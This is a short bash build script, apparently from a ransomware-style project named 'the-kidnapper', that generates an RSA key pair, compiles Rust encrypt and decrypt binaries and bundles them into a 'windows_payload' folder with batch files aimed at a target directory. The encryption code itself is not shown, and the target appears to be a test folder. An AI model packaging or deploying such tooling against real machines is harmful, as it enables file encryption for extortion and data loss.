#!/bin/bash

[ -d windows_payload ] || mkdir windows_payload

TARGET_DIR='%%homedrive%%%%homepath%%\\Programming\\the-kidnapper\\some_target_dir'

printf "@echo off\nset TARGET_DIR=$TARGET_DIR\nencrypt.exe" > windows_payload/exec_win.bat

printf "@echo off\nset TARGET_DIR=$TARGET_DIR\ndecrypt.exe" > windows_payload/exec_win_decrypt.bat

./gen_rsa_keypair.sh
cp public_key.pem windows_payload

cargo build

cp ./target/debug/encrypt.exe windows_payload
cp ./target/debug/decrypt.exe windows_payload
